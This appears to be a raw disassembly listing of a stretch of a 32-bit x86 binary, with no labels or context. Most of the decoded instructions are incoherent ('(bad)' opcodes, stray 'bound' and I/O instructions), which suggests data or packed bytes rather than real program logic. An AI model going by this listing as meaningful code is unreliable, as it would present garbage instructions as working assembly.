  4185f2:	add    BYTE PTR [eax],al
  4185f4:	add    eax,0x43624062
  4185f9:	inc    ecx
  4185fa:	inc    eax
  4185fb:	inc    eax
  4185fc:	inc    eax
  4185fd:	add    eax,0x40624340
  418602:	add    eax,0x40664140
  418607:	mov    esp,0xe0051444
  41860c:	inc    eax
  41860d:	sub    BYTE PTR [edx+ebp*2],0x63
  418611:	inc    eax
  418612:	inc    eax
  418613:	push   esp
  418614:	adc    ah,BYTE PTR [ebx-0x58]
  418617:	imul   ebp,ebp,0x31
  41861a:	add    al,0xff
  41861c:	jle    0x418602
  41861e:	adc    ah,bl
  418620:	inc    ebx
  418621:	add    BYTE PTR ds:0x41107840,al
  418627:	bound  eax,QWORD PTR [eax+0x40]
  41862a:	sldt   WORD PTR [eax-0x34]
  41862e:	js     0x418692
  418630:	add    eax,0x40664143
  418635:	inc    ebx
  418636:	add    BYTE PTR [ecx+0x5],al
  418639:	js     0x41867b
  41863b:	bound  eax,QWORD PTR [eax+0x0]
  41863e:	inc    eax
  41863f:	xor    ebp,DWORD PTR [eax+eax*2+0x4c]
  418643:	inc    eax
  418644:	sbb    al,0x80
  418646:	(bad)  
  418647:	(bad)  [ebx+0x40]
  41864a:	push   esp
  41864b:	daa    
  41864c:	sub    eax,0x43634c05
  418651:	inc    eax
  418652:	gs inc eax
  418654:	mov    bl,0xcd
  418656:	ins    DWORD PTR es:[edi],dx
  418657:	into   
  418658:	rol    DWORD PTR [eax+0x44],1
  41865b:	cs jb  0x41869e
  41865e:	inc    esi
  41865f:	cld    
  418660:	addr16 inc eax
  418662:	rol    esi,1
  418664:	test   al,0x2a
  418666:	in     al,dx
  418667:	fs out dx,al
  418669:	inc    ecx
  41866a:	inc    ebx
  41866b:	inc    eax
  41866c:	inc    eax
  41866d:	add    eax,0x434162
  418672:	inc    eax
  418673:	add    BYTE PTR [edx+0x5],ah
  418676:	inc    eax
  418677:	adc    BYTE PTR [edx+0x40],ah
  41867a:	inc    ebx
  41867b:	inc    ecx
  41867c:	add    eax,0x4340
  418681:	add    eax,0x404162
  418686:	add    BYTE PTR [eax+0x43],al
  418689:	inc    eax
  41868a:	add    eax,0x10404d0c
  41868f:	push   0x402ba852
  418694:	fsubr  QWORD PTR [esp+edx*4]
  418697:	inc    esi
  418698:	cmp    BYTE PTR [eax+0x67],al
  41869b:	or     eax,0x19426262
  4186a0:	xchg   ebp,eax
  4186a1:	inc    eax
  4186a2:	sub    BYTE PTR [eax+0x40],al
  4186a5:	bound  eax,QWORD PTR [edi]
  4186a7:	inc    eax
  4186a8:	push   edx
  4186a9:	rol    BYTE PTR [edx+0x14],0x7d
  4186ad:	inc    eax
  4186ae:	sub    BYTE PTR [edx-0x6],ah
  4186b1:	inc    ebx
  4186b2:	cmovo  ebx,DWORD PTR [eax+0x70a54033]
  4186b9:	inc    eax
  4186ba:	add    BYTE PTR [eax],al
  4186bc:	inc    ecx
  4186bd:	inc    ebx
  4186be:	add    eax,0x41784062
  4186c3:	inc    eax
  4186c4:	inc    eax
  4186c5:	add    BYTE PTR [edi],cl
  4186c7:	bound  eax,QWORD PTR [ebx+0x0]
  4186ca:	add    eax,0x25006240
  4186cf:	inc    eax
  4186d0:	add    eax,0x40254143
  4186d5:	add    eax,0x28620000
  4186da:	push   esp
  4186db:	or     BYTE PTR [ecx+0x52],al
  4186de:	mov    ebx,0x624364a9
  4186e3:	inc    eax
  4186e4:	test   DWORD PTR [eax+0x5],0x4068acb8
  4186eb:	outs   dx,BYTE PTR ds:[esi]
  4186ec:	add    edi,DWORD PTR [esi+eax*4+0x3034582a]
  4186f3:	inc    eax
  4186f4:	xor    al,BYTE PTR [eax+0x34]
  4186f7:	aas    
  4186f8:	bound  edx,QWORD PTR [edx]
  4186fa:	ins    BYTE PTR es:[edi],dx
  4186fb:	push   cs
  4186fc:	and    al,0x2c
  4186fe:	mov    edx,0x68a24864
  418703:	inc    eax
  418704:	dec    ecx
  418705:	inc    eax
  418706:	add    eax,0x43914243
  41870b:	rsqrtps xmm5,XMMWORD PTR [eax]
  41870e:	xchg   BYTE PTR [ecx+eiz*1+0x4c],bh
  418712:	rol    DWORD PTR [eax+0x7c],1
  418715:	inc    ebx
  418716:	add    BYTE PTR [eax],al
  418718:	add    BYTE PTR [ecx+0x40],al
  41871b:	bound  esp,QWORD PTR [esi+0x0]
  41871e:	inc    eax
  41871f:	add    eax,0x5400000
  418724:	inc    ecx
  418725:	inc    eax
  418726:	inc    eax
  418727:	bound  esp,QWORD PTR ds:0x25050043
  41872d:	inc    ecx
  41872e:	inc    ebx
  41872f:	inc    eax
  418730:	test   BYTE PTR [eax+0x0],al
  418733:	bound  ebx,QWORD PTR [eax+0x62]
  418736:	inc    ecx
  418737:	inc    eax
  418738:	loopne 0x41875f
  41873a:	jae    0x418798
  41873c:	adc    eax,0x40540904
  418741:	mov    ecx,0xd1cb1500
  418746:	inc    eax
  418747:	mov    ebp,0xd8590523
  41874c:	adc    ecx,esi
  41874e:	adc    al,0x56
  418750:	inc    eax
  418751:	xchg   ch,bl
  418753:	pop    esi
  418754:	lods   al,BYTE PTR ds:[esi]
  418755:	inc    ax
  418757:	push   ecx
  418758:	xor    ebp,DWORD PTR [ecx]
  41875a:	jbe    0x4187bf
  41875c:	inc    ebp
  41875d:	inc    ecx
  41875e:	add    eax,DWORD PTR [esp+ebx*1-0x48]
  418762:	add    BYTE PTR [ebp+0x10],0x62
  418766:	inc    eax
  418767:	inc    ecx
  418768:	and    eax,0x40000500
  41876d:	inc    ebx
  41876e:	add    eax,0x40624041
  418773:	inc    ebx
  418774:	add    eax,0x43402541
  418779:	bound  eax,QWORD PTR [eax+0x43]
  41877c:	int3   
  41877d:	inc    eax
  41877e:	bound  eax,QWORD PTR [eax]
  418780:	inc    ecx
  418781:	inc    eax
  418782:	inc    eax
  418783:	add    eax,0x40475905
  418788:	mov    bh,0x42
  41878a:	add    eax,0x24943077
  41878f:	adc    eax,0x90861697
  418794:	inc    esp
  418795:	imul   ecx,DWORD PTR [eax+eax*2],0x40
  418799:	cmp    al,0x35
  41879b:	mov    DWORD PTR [ebp+0x6c],0x44541240
  4187a2:	mov    bh,0x2c
  4187a4:	ror    esp,1
  4187a6:	xor    DWORD PTR [eax+0x70],eax
  4187a9:	sub    eax,DWORD PTR ds:0x6cbe58b0
  4187af:	adc    al,0x40
  4187b1:	dec    edx
  4187b2:	xchg   BYTE PTR [ebx],ah
  4187b4:	inc    ebp
  4187b5:	fadd   QWORD PTR ds:0x11645040
  4187bb:	sbb    eax,0x4062a531
  4187c0:	and    eax,0x5406600
  4187c5:	inc    ebx
  4187c6:	inc    ecx
  4187c7:	inc    eax
  4187c8:	inc    eax
  4187c9:	inc    ebx
  4187ca:	add    BYTE PTR [eax],al
  4187cc:	add    BYTE PTR [edx-0x34],ah
  4187cf:	inc    eax
  4187d0:	add    eax,0x40004041
  4187d5:	inc    ecx
  4187d6:	int3   
  4187d7:	add    BYTE PTR [ebx-0x7c],al
  4187da:	add    eax,0x5406240
  4187df:	bound  eax,QWORD PTR [ebx+0x13]
  4187e2:	js     0x418824
  4187e4:	mov    dh,0x63
  4187e6:	sub    al,0xa9
  4187e8:	rol    DWORD PTR [eax+0x44],1
  4187eb:	and    DWORD PTR ds:0x3aa8244f,eax
  4187f1:	push   cs
  4187f2:	stc    
  4187f3:	je     0x41877b
  4187f5:	xor    ecx,DWORD PTR [edx+0x68]
  4187f8:	out    0x40,eax
  4187fa:	inc    ebp
  4187fb:	inc    eax
  4187fc:	outs   dx,DWORD PTR ds:[esi]
  4187fd:	push   ecx
  4187fe:	(bad)  
  4187ff:	push   esi
  418801:	or     eax,ebx
  418803:	xor    esi,DWORD PTR [ebp-0x24927e9d]
  418809:	inc    eax
  41880a:	jno    0x418868
  41880c:	add    eax,0x284506b0
  418811:	pop    ds
  418812:	dec    ecx
  418813:	inc    eax
  418814:	xchg   BYTE PTR ds:0x4042fca8,al
  41881a:	rol    DWORD PTR [eax+0x62],1
  41881d:	pop    eax
  41881e:	inc    ecx
  41881f:	add    eax,0x40404340
  418824:	inc    ebx
  418825:	inc    eax
  418826:	test   BYTE PTR [eax],al
  418828:	add    eax,0x40624041
  41882d:	inc    eax
  41882e:	add    BYTE PTR [edx+0x5],ah
  418831:	inc    ebx
  418832:	add    BYTE PTR [eax+0x78],al
  418835:	inc    ecx
  418836:	add    BYTE PTR [eax+0x41],bl
  418839:	bound  esi,QWORD PTR [edx]
  41883b:	pusha  
  41883c:	leave  
  41883d:	adc    DWORD PTR [edx+0x9],ebp
  418840:	adc    al,0xed
  418842:	jl     0x4187f8
  418844:	xchg   ecx,eax
  418845:	mov    ah,0x5c
  418847:	pushf  
  418848:	inc    eax
  418849:	arpl   WORD PTR [edx+0x5],ax
  41884c:	inc    ecx
  41884d:	inc    edx
  41884e:	dec    esp
  41884f:	bound  edx,QWORD PTR [eax]
  418851:	mov    cl,0x40
  418853:	test   BYTE PTR [eax],al
  418855:	int3   
  418856:	bound  eax,QWORD PTR ds:0xcc840f41
  41885c:	inc    ebx
  41885d:	add    BYTE PTR [eax+0x0],al
  418860:	inc    eax
  418861:	inc    eax
  418862:	inc    eax
  418863:	int3   
  418864:	add    BYTE PTR ds:0x62404341,al
  41886a:	pop    eax
  41886b:	add    BYTE PTR [ebx+0x40],al
  41886e:	bound  ecx,QWORD PTR [edi]
  418870:	inc    eax
  418871:	pusha  
  418872:	xchg   BYTE PTR [ebx+0x75],bl
  418875:	jge    0x4188b7
  418877:	inc    eax
  418878:	dec    ecx
  418879:	jmp    0x1930:0x67ac282c
  418880:	icebp  
  418881:	mov    BYTE PTR [ebx+0x6c68522c],dh
  418887:	inc    eax
  418888:	pop    ebx
  418889:	inc    eax
  41888a:	add    eax,0x22ec421b
  41888f:	adc    dl,BYTE PTR [ecx+0x29]
  418892:	xchg   BYTE PTR [ebp+0x404767c9],ch
  418898:	ins    BYTE PTR es:[edi],dx
  418899:	inc    eax
  41889a:	sub    al,0x62
  41889c:	mov    ah,0x71
  41889e:	lds    eax,FWORD PTR [ebx]
  4188a0:	xchg   ecx,eax
  4188a1:	sub    eax,0x70b2
  4188a6:	inc    eax
  4188a7:	inc    eax
  4188a8:	cmovno eax,DWORD PTR ds:0x40056243
  4188af:	int3   
  4188b0:	add    ah,cl
  4188b2:	inc    eax
  4188b3:	inc    eax
  4188b4:	bound  eax,QWORD PTR [ecx+0x0]
  4188b7:	add    BYTE PTR [edi],cl
  4188b9:	inc    ebx
  4188ba:	inc    eax
  4188bb:	inc    eax
  4188bc:	add    BYTE PTR [ecx+0x43],al
  4188bf:	add    eax,0x40256240
  4188c4:	bound  eax,QWORD PTR [eax]
  4188c6:	mov    cl,0x38
  4188c8:	or     al,BYTE PTR [eax+0x4c]
  4188cb:	sub    BYTE PTR ds:0x1a626789,al
  4188d1:	add    eax,0xff864413
  4188d6:	bound  esp,QWORD PTR [ebx+0x245040d8]
  4188dc:	add    esi,ebp
  4188de:	retf   
  4188df:	pop    eax
  4188e0:	dec    esp
  4188e1:	add    al,0x91
  4188e3:	inc    eax
  4188e4:	mov    cl,0xb4
  4188e6:	dec    edx
  4188e7:	bound  eax,QWORD PTR [ecx+0x40]
  4188ea:	dec    esp
  4188eb:	xor    al,BYTE PTR ds:0x43c83415
  4188f1:	inc    eax
  4188f2:	jnp    0x4188bc
  4188f4:	xchg   bl,cl
  4188f6:	or     eax,DWORD PTR [edx+0x30]
  4188f9:	inc    eax
  4188fa:	pop    ecx
  4188fb:	add    eax,0x4140cc00
  418900:	inc    eax
  418901:	inc    ebx
  418902:	bound  esp,QWORD PTR ds:0x41400043
  418908:	add    BYTE PTR [eax],al
  41890a:	add    eax,0x43624062
  41890f:	inc    ecx
  418910:	inc    eax
  418911:	inc    eax
  418912:	inc    eax
  418913:	add    eax,0x40624340
  418918:	add    eax,0x40664140
  41891d:	inc    eax
  41891e:	outs   dx,DWORD PTR ds:[esi]
  41891f:	adc    DWORD PTR [ebx+0x29],ebx
  418922:	add    al,0x14
  418924:	adc    DWORD PTR ds:0xc76250b0,esi
  41892a:	inc    eax
  41892b:	inc    eax
  41892c:	mov    edi,0x4a0d0540
  418931:	test   al,0x31
  418933:	sbb    BYTE PTR [esi+0x37],al
  418936:	xchg   BYTE PTR [ebx-0x37],al
  418939:	adc    BYTE PTR [eax+eax*2+0x51],ch
  41893d:	inc    ebx
  41893e:	add    BYTE PTR ds:0x41107840,al
  418944:	bound  eax,QWORD PTR [eax+0x40]
  418947:	sldt   WORD PTR [eax-0x34]
  41894b:	js     0x4189af
  41894d:	add    eax,0x40664143
  418952:	inc    ebx
  418953:	add    BYTE PTR [ecx+0x5],al
  418956:	js     0x418998
  418958:	bound  eax,QWORD PTR [eax+0x0]
  41895b:	inc    eax
  41895c:	inc    eax
  41895d:	pusha  
  41895e:	pop    edx
  41895f:	inc    esp
  418960:	lods   al,BYTE PTR ds:[esi]
  418961:	aas    
  418962:	adc    al,0x4c
  418964:	pusha  
  418965:	scas   eax,DWORD PTR es:[edi]
  418966:	fdiv   st,st(2)
  418968:	inc    ecx
  418969:	jb     0x4189ab
  41896b:	sbb    DWORD PTR [eax+0x5],eax
  41896e:	adc    BYTE PTR [eax+ebx*2-0xb],dl
  418972:	outs   dx,BYTE PTR ds:[esi]
  418973:	inc    ebx
  418974:	xchg   BYTE PTR cs:[eax+esi*8-0x64bf90d4],bl
  41897c:	inc    eax
  41897d:	xor    eax,DWORD PTR ds:0xe7f927d
  418983:	int3   
  418984:	int3   
  418985:	int3   
  418986:	int3   
  418987:	int3   
  418988:	int3   
  418989:	int3   
  41898a:	int3   
  41898b:	int3   
  41898c:	int3   
  41898d:	int3   
  41898e:	int3   
  41898f:	int3   
  418990:	inc    ebx
  418991:	int3   
  418992:	inc    eax
  418993:	bound  eax,QWORD PTR [eax]
  418995:	inc    ecx
  418996:	inc    eax
  418997:	inc    eax
  418998:	add    eax,0x89bb505
  41899d:	push   ebp
  41899e:	dec    ebp
  41899f:	or     al,0x88
  4189a1:	clc    
  4189a2:	pusha  
  4189a3:	xor    al,0xa9
  4189a5:	inc    esp
  4189a6:	aam    0x67
  4189a8:	add    eax,0x51625382
  4189ad:	pop    ecx
  4189ae:	int    0x4a
  4189b0:	xchg   DWORD PTR ds:0x52ef2241,edx
  4189b6:	inc    eax
  4189b7:	cmp    BYTE PTR [ecx+0x7c],al
  4189ba:	sub    BYTE PTR [edx],0x4d
  4189bd:	push   ecx
  4189be:	mov    BYTE PTR [eax+0x47349706],dl
  4189c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189c5:	push   edx
  4189c6:	inc    edx
  4189c7:	pop    ebx
  4189c8:	les    eax,FWORD PTR [eax+0x4062a2d4]
  4189ce:	and    eax,0x5406600
  4189d3:	inc    ebx
  4189d4:	inc    ecx
  4189d5:	inc    eax
  4189d6:	inc    eax
  4189d7:	inc    ebx
  4189d8:	add    BYTE PTR [eax],al
  4189da:	add    BYTE PTR [edx-0x34],ah
  4189dd:	inc    eax
  4189de:	add    eax,0x40004041
  4189e3:	inc    ecx
  4189e4:	int3   
  4189e5:	add    BYTE PTR [ebx-0x7c],al
  4189e8:	add    eax,0x5406240
  4189ed:	bound  ebp,QWORD PTR [edi-0x37]
  4189f0:	push   edx
  4189f1:	test   al,0x62
  4189f3:	or     eax,0x424d3001
  4189f8:	enter  0x1812,0x7d
  4189fc:	inc    edx
  4189fd:	dec    eax
  4189fe:	jecxz  0x4189e8
  418a00:	dec    eax
  418a01:	mov    ah,0x34
  418a03:	add    BYTE PTR [eax],0x64
  418a06:	adc    al,0x47
  418a08:	xor    BYTE PTR [edx-0x80],al
  418a0b:	(bad)  
  418a0c:	js     0x418a7c
  418a0e:	loop   0x4189b8
  418a10:	xor    ch,BYTE PTR [edi-0xa]
  418a13:	add    eax,0x117f4040
  418a18:	aad    0xd8
  418a1a:	dec    edi
  418a1b:	pop    esi
  418a1c:	ins    BYTE PTR es:[edi],dx
  418a1d:	popa   
  418a1e:	mov    dh,0xa0
  418a20:	pop    ebp
  418a21:	inc    ecx
  418a22:	dec    ecx
  418a23:	inc    eax
  418a24:	bound  ebx,QWORD PTR [eax+0x41]
  418a27:	add    eax,0x40404340
  418a2c:	inc    ebx
  418a2d:	inc    eax
  418a2e:	test   BYTE PTR [eax],al
  418a30:	add    eax,0x40624041
  418a35:	inc    eax
  418a36:	add    BYTE PTR [edx+0x5],ah
  418a39:	inc    ebx
  418a3a:	add    BYTE PTR [eax+0x78],al
  418a3d:	inc    ecx
  418a3e:	add    BYTE PTR [eax+0x41],bl
  418a41:	(bad)  
  418a42:	jmp    0x303a:0xd401574
  418a49:	psubb  mm0,QWORD PTR [eax+0x45]
  418a4d:	xor    al,0x42
  418a4f:	add    BYTE PTR [eax],cl
  418a51:	push   ebx
  418a52:	cld    
  418a53:	jo     0x418a75
  418a55:	push   edx
  418a56:	push   edx
  418a57:	inc    esp
  418a58:	test   al,0x40
  418a5a:	test   BYTE PTR [eax],al
  418a5c:	int3   
  418a5d:	bound  eax,QWORD PTR ds:0xcc840f41
  418a63:	inc    ebx
  418a64:	add    BYTE PTR [eax+0x0],al
  418a67:	inc    eax
  418a68:	inc    eax
  418a69:	inc    eax
  418a6a:	int3   
  418a6b:	add    BYTE PTR ds:0x62404341,al
  418a71:	pop    eax
  418a72:	add    BYTE PTR [ebx+0x40],al
  418a75:	bound  ecx,QWORD PTR [edi]
  418a77:	inc    eax
  418a78:	and    BYTE PTR ds:0xa8e26f40,dl
  418a7e:	bound  edx,QWORD PTR [eax]
  418a80:	dec    ecx
  418a81:	dec    ebx
  418a82:	jb     0x418b01
  418a84:	sub    DWORD PTR [edi-0x33],ecx
  418a87:	mov    eax,0xa040d3d9
  418a8c:	dec    eax
  418a8d:	cld    
  418a8e:	imul   eax,DWORD PTR [ecx-0x12],0xe17a6035
  418a95:	pop    edx
  418a96:	cmc    
  418a97:	outs   dx,DWORD PTR ds:[esi]
  418a98:	add    BYTE PTR [eax],al
  418a9a:	inc    eax
  418a9b:	inc    eax
  418a9c:	cmovno eax,DWORD PTR ds:0x40056243
  418aa3:	int3   
  418aa4:	add    ah,cl
  418aa6:	inc    eax
  418aa7:	inc    eax
  418aa8:	bound  eax,QWORD PTR [ecx+0x0]
  418aab:	add    BYTE PTR [edi],cl
  418aad:	inc    ebx
  418aae:	inc    eax
  418aaf:	inc    eax
  418ab0:	add    BYTE PTR [ecx+0x43],al
  418ab3:	add    eax,0x40256240
  418ab8:	bound  eax,QWORD PTR [eax]
  418aba:	test   al,0x44
  418abc:	or     dl,BYTE PTR [eax+0x5f]
  418abf:	inc    sp
  418ac1:	fcom   DWORD PTR [ecx]
  418ac3:	and    DWORD PTR [ecx+0x2c992160],eax
  418ac9:	inc    ecx
  418aca:	dec    eax
  418acb:	dec    eax
  418acc:	inc    ecx
  418acd:	xor    al,0x41
  418acf:	push   edx
  418ad0:	cs xor al,0x41
  418ad3:	int    0x6c
  418ad5:	inc    ebp
  418ad6:	and    DWORD PTR [ecx-0x3b],eax
  418ad9:	adc    eax,0x40cc0005
  418ade:	inc    ecx
  418adf:	inc    eax
  418ae0:	inc    ebx
  418ae1:	bound  esp,QWORD PTR ds:0x41400043
  418ae7:	add    BYTE PTR [eax],al
  418ae9:	add    eax,0x43624062
  418aee:	inc    ecx
  418aef:	inc    eax
  418af0:	inc    eax
  418af1:	inc    eax
  418af2:	add    eax,0x40624340
  418af7:	add    eax,0x40664140
  418afc:	jne    0x418ac7
  418afe:	add    al,ah
  418b00:	jl     0x418b22
  418b02:	pop    ebp
  418b03:	test   al,0xd4
  418b05:	adc    ebp,DWORD PTR es:[eax]
  418b08:	and    esp,edi
  418b0a:	adc    BYTE PTR [ecx],0x62
  418b0d:	mov    DWORD PTR [eax-0x16],eax
  418b10:	outs   dx,DWORD PTR ds:[esi]
  418b11:	push   ebp
  418b12:	add    BYTE PTR [ecx+ebp*1+0x440d1242],bh
  418b19:	leave  
  418b1a:	xchg   esp,eax
  418b1b:	inc    ecx
  418b1c:	mov    al,ds:0x202d4369
  418b21:	test   al,0x62
  418b23:	inc    ebp
  418b24:	arpl   WORD PTR [edx+eax*1],sp
  418b27:	jne    0x418b2d
  418b29:	inc    ecx
  418b2a:	aad    0xb8
  418b2c:	repz inc esi
  418b2e:	bound  eax,QWORD PTR ss:[ecx+0x51]
  418b32:	inc    ebx
  418b33:	add    BYTE PTR ds:0x41107840,al
  418b39:	bound  eax,QWORD PTR [eax+0x40]
  418b3c:	sldt   WORD PTR [eax-0x34]
  418b40:	js     0x418ba4
  418b42:	add    eax,0x40664143
  418b47:	inc    ebx
  418b48:	add    BYTE PTR [ecx+0x5],al
  418b4b:	js     0x418b8d
  418b4d:	bound  eax,QWORD PTR [eax+0x0]
  418b50:	inc    eax
  418b51:	adc    BYTE PTR [edi-0x20],ah
  418b54:	lds    eax,FWORD PTR [ebx+0x7a]
  418b57:	and    ah,al
  418b59:	cmc    
  418b5a:	ret    
  418b5b:	mov    al,0x53
  418b5d:	sub    DWORD PTR [ecx+0x2e],0xce234480
  418b64:	loop   0x418b55
  418b66:	and    dh,BYTE PTR [ecx*2+0x6c39a82c]
  418b6d:	xor    DWORD PTR [ebx],0xffffffe1
  418b70:	leave  
  418b71:	sub    dl,BYTE PTR [edx]
  418b73:	addr16 and al,0xcb
  418b76:	jmp    0xbd0f37cc
  418b7b:	push   eax
  418b7c:	inc    esp
  418b7d:	(bad)  
  418b7e:	loopne 0x418ba0
  418b80:	or     eax,0x44b84268
  418b85:	add    DWORD PTR [edi],ebp
  418b87:	or     ebx,ecx
  418b89:	inc    ecx
  418b8a:	inc    ebx
  418b8b:	inc    eax
  418b8c:	inc    eax
  418b8d:	add    eax,0x434162
  418b92:	inc    eax
  418b93:	add    BYTE PTR [edx+0x5],ah
  418b96:	inc    eax
  418b97:	adc    BYTE PTR [edx+0x40],ah
  418b9a:	inc    ebx
  418b9b:	inc    ecx
  418b9c:	add    eax,0x4340
  418ba1:	add    eax,0x404162
  418ba6:	add    BYTE PTR [eax+0x43],al
  418ba9:	inc    eax
  418baa:	add    eax,0xb56a6fe6
  418baf:	inc    ebx
  418bb0:	jne    0x418bf2
  418bb2:	gs inc esp
  418bb4:	fdivr  DWORD PTR [eax+0x69]
  418bb7:	add    ah,BYTE PTR [edx-0x14]
  418bba:	inc    esp
  418bbb:	sub    al,0x65
  418bbd:	lods   al,BYTE PTR ds:[esi]
  418bbe:	inc    edx
  418bbf:	sub    DWORD PTR [ebp-0x73d7ada0],edx
  418bc5:	ret    
  418bc6:	int    0x63
  418bc8:	ins    DWORD PTR es:[edi],dx
  418bc9:	sub    al,0x24
  418bcb:	lds    esp,FWORD PTR [edi+edi*4+0x4b]
  418bcf:	add    DWORD PTR [edi+0x61],ebx
  418bd2:	data16 addr16 xor al,0x3f
  418bd6:	inc    BYTE PTR [edi]
  418bd8:	loop   0x418c41
  418bda:	adc    al,0x1a
  418bdc:	test   al,0x81
  418bde:	inc    eax
  418bdf:	add    BYTE PTR [eax],al
  418be1:	inc    ecx
  418be2:	inc    ebx
  418be3:	add    eax,0x41784062
  418be8:	inc    eax
  418be9:	inc    eax
  418bea:	add    BYTE PTR [edi],cl
  418bec:	bound  eax,QWORD PTR [ebx+0x0]
  418bef:	add    eax,0x25006240
  418bf4:	inc    eax
  418bf5:	add    eax,0x40254143
  418bfa:	add    eax,0x63620000
  418bff:	add    esi,DWORD PTR [ecx+eiz*4]
  418c02:	arpl   WORD PTR [edx+ecx*2+0x38],sp
  418c06:	xor    BYTE PTR [ebx+0x42],dh
  418c09:	push   ebp
  418c0a:	pushf  
  418c0b:	inc    esp
  418c0c:	test   al,0x5f
  418c0e:	inc    eax
  418c0f:	and    BYTE PTR [ecx],0x22
  418c12:	js     0x418c40
  418c14:	adc    DWORD PTR [eax],ebp
  418c16:	lds    esi,FWORD PTR ds:0x2689294e
  418c1c:	mov    eax,0x214453bf
  418c21:	inc    ebx
  418c22:	arpl   bp,dx
  418c24:	inc    ecx
  418c25:	mov    dl,ah
  418c27:	add    eax,0x1e2da0d9
  418c2c:	inc    ebp
  418c2d:	ret    
  418c2e:	inc    esp
  418c2f:	popf   
  418c30:	test   al,0x33
  418c32:	fsubr  st(6),st
  418c34:	mov    eax,0x394a2c43
  418c39:	inc    ebx
  418c3a:	add    BYTE PTR [eax],al
  418c3c:	add    BYTE PTR [ecx+0x40],al
  418c3f:	bound  esp,QWORD PTR [esi+0x0]
  418c42:	inc    eax
  418c43:	add    eax,0x5400000
  418c48:	inc    ecx
  418c49:	inc    eax
  418c4a:	inc    eax
  418c4b:	bound  esp,QWORD PTR ds:0x25050043
  418c51:	inc    ecx
  418c52:	inc    ebx
  418c53:	inc    eax
  418c54:	test   BYTE PTR [eax+0x0],al
  418c57:	bound  ebx,QWORD PTR [eax+0x62]
  418c5a:	inc    ecx
  418c5b:	inc    eax
  418c5c:	cmp    DWORD PTR [ebx-0x6],esp
  418c5f:	ins    DWORD PTR es:[edi],dx
  418c60:	stos   DWORD PTR es:[edi],eax
  418c61:	mov    esi,0xbce1c082
  418c66:	mov    edi,0x2ed5b064
  418c6b:	and    esi,DWORD PTR ds:0x53cbfc8
  418c71:	imul   esp,DWORD PTR [ecx],0xbfe54d1d
  418c77:	test   al,0xcb
  418c79:	out    0x1,al
  418c7b:	jle    0x418c7e
  418c7d:	arpl   WORD PTR [edx+eax*8],sp
  418c80:	inc    ebp
  418c81:	adc    BYTE PTR [edx+0x40],ah
  418c84:	inc    ecx
  418c85:	and    eax,0x40000500
  418c8a:	inc    ebx
  418c8b:	add    eax,0x40624041
  418c90:	inc    ebx
  418c91:	add    eax,0x43402541
  418c96:	bound  eax,QWORD PTR [eax+0x43]
  418c99:	int3   
  418c9a:	inc    eax
  418c9b:	bound  eax,QWORD PTR [eax]
  418c9d:	inc    ecx
  418c9e:	inc    eax
  418c9f:	inc    eax
  418ca0:	add    eax,0xa1004405
  418ca5:	jmp    0x46ea5a75
  418caa:	sub    al,0x81
  418cac:	lds    eax,FWORD PTR [ecx+0x411143d9]
  418cb2:	mov    esp,0x992ca1c3
  418cb7:	ss mov ah,0x8c
  418cba:	int    0x85
  418cbc:	inc    ebp
  418cbd:	add    esp,DWORD PTR [edx-0x1c]
  418cc0:	inc    edx
  418cc1:	sbb    al,0x0
  418cc3:	add    BYTE PTR [edi],bl
  418cc5:	je     0x418cc7
  418cc7:	add    BYTE PTR [edx],ah
  418cc9:	rol    BYTE PTR [eax],0x0
  418ccc:	and    BYTE PTR [ecx],cl
  418cce:	add    DWORD PTR [eax],eax
  418cd0:	and    ebp,DWORD PTR [eax+0x1]
  418cd3:	add    BYTE PTR [ecx],ah
  418cd5:	mov    al,0x1
  418cd7:	add    BYTE PTR [edx],ah
  418cd9:	cli    
  418cda:	add    DWORD PTR [eax],eax
  418cdc:	pop    ds
  418cdd:	xor    al,0x2
  418cdf:	add    BYTE PTR [edi],bl
  418ce1:	test   DWORD PTR [edx],eax
  418ce3:	add    BYTE PTR [edx],ah
  418ce5:	mov    esp,0xa220002
  418cea:	add    ah,cl
  418cec:	int3   
  418ced:	int3   
  418cee:	int3   
  418cef:	int3   
  418cf0:	inc    ecx
  418cf1:	inc    eax
  418cf2:	scas   al,BYTE PTR es:[edi]
  418cf3:	int    0x62
  418cf5:	mov    edi,0x25d5402d
  418cfa:	add    eax,0x419d3712
  418cff:	inc    ebx
  418d00:	inc    eax
  418d01:	inc    eax
  418d02:	add    eax,0x434162
  418d07:	inc    eax
  418d08:	add    BYTE PTR [edx+0x5],ah
  418d0b:	inc    eax
  418d0c:	adc    BYTE PTR [edx+0x40],ah
  418d0f:	inc    ebx
  418d10:	inc    ecx
  418d11:	add    eax,0x4340
  418d16:	add    eax,0x404162
  418d1b:	add    BYTE PTR [eax+0x43],al
  418d1e:	inc    eax
  418d1f:	add    eax,0x40750f47
  418d24:	xchg   BYTE PTR [esp+eax*2-0xfbfd86e],ch
  418d2b:	xor    al,0x37
  418d2d:	adc    eax,0x9006262
  418d32:	jp     0x418d74
  418d34:	lods   eax,DWORD PTR ds:[esi]
  418d35:	retf   
  418d36:	rcl    eax,0x40
  418d39:	inc    eax
  418d3a:	fisub  DWORD PTR [ecx]
  418d3c:	add    eax,0x3147fc40
  418d41:	adc    al,0x31
  418d43:	inc    eax
  418d44:	xchg   BYTE PTR [eax+0x0],al
  418d47:	add    BYTE PTR [ecx+0x43],al
  418d4a:	add    eax,0x41784062
  418d4f:	inc    eax
  418d50:	inc    eax
  418d51:	add    BYTE PTR [edi],cl
  418d53:	bound  eax,QWORD PTR [ebx+0x0]
  418d56:	add    eax,0x25006240
  418d5b:	inc    eax
  418d5c:	add    eax,0x40254143
  418d61:	add    eax,0x2a620000
  418d66:	push   ebx
  418d67:	and    eax,0x457406c
  418d6c:	das    
  418d6d:	inc    edi
  418d6e:	sbb    dl,0xdc
  418d71:	add    edx,DWORD PTR [edx+0x40]
  418d74:	lods   al,BYTE PTR ds:[esi]
  418d75:	ss mov esp,0xbb4043a8
  418d7b:	cmc    
  418d7c:	add    eax,0xd17952a8
  418d81:	adc    eax,0x6586c624
  418d86:	test   al,0x12
  418d88:	dec    ebp
  418d89:	inc    eax
  418d8a:	or     ebp,DWORD PTR [ebp+0x24]
  418d8d:	inc    eax
  418d8e:	adc    BYTE PTR [edx-0x59],ah
  418d91:	adc    dh,BYTE PTR [ecx]
  418d93:	xlat   BYTE PTR ds:[ebx]
  418d94:	stos   DWORD PTR es:[edi],eax
  418d95:	add    DWORD PTR [ebp+eax*8+0x4342407f],esi
  418d9c:	add    BYTE PTR [eax],al
  418d9e:	add    BYTE PTR [ecx+0x40],al
